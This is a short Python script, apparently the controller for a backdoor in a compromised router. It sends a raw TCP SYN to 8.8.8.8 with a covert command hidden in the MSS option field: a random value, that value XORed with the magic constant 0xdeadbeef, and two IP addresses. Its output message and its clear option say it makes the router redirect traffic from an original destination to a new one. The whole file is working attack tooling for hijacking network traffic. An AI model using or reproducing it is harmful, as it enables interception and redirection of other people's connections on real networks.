#!/usr/bin/env python
import random
import struct
import socket
import sys
from optparse import OptionParser
from scapy.all import *

XOR_MAGIC = 0xdeadbeef
MAX_UINT32 = 2**32

parser = OptionParser()
parser.add_option("-o", "--orig-dest", dest='original_ip', help="original ip destination")
parser.add_option("-n", "--new-dest", dest='new_ip', help="new ip destination")
parser.add_option("-c", "--clear", action='store_true', dest='clear', help="clear our IP hook")
(options, args) = parser.parse_args()
if options.clear:
    options.original_ip = "0.0.0.0"
    options.new_ip = "0.0.0.0"
if not options.original_ip: 
    parser.error('original dest ip not given')
if not options.new_ip: 
    parser.error('new dest ip not given')

print "router hooked %s to %s" % (options.original_ip, options.new_ip)

random_number = random.randint(0, MAX_UINT32)
xored_random_numer = random_number ^ XOR_MAGIC
print "random 4 bytes number: %d" % random_number
print "xored with magic: %d" %xored_random_numer


ip  = IP(dst="8.8.8.8")
tcp = TCP(sport= random.randint(1000,2**16),
          dport= 80, 
          flags   = 'S',
          options = [('MSS',
                      struct.pack("<I", random_number) + 
                      struct.pack("<I", xored_random_numer) +
                      socket.inet_aton(options.original_ip) + 
                      socket.inet_aton(options.new_ip)
          )])
# send packet using raw socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
# dont put headers
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
s.sendto(bytes(ip/tcp), ("8.8.8.8" , 0 ))

# using scpay
#send(ip/tcp)
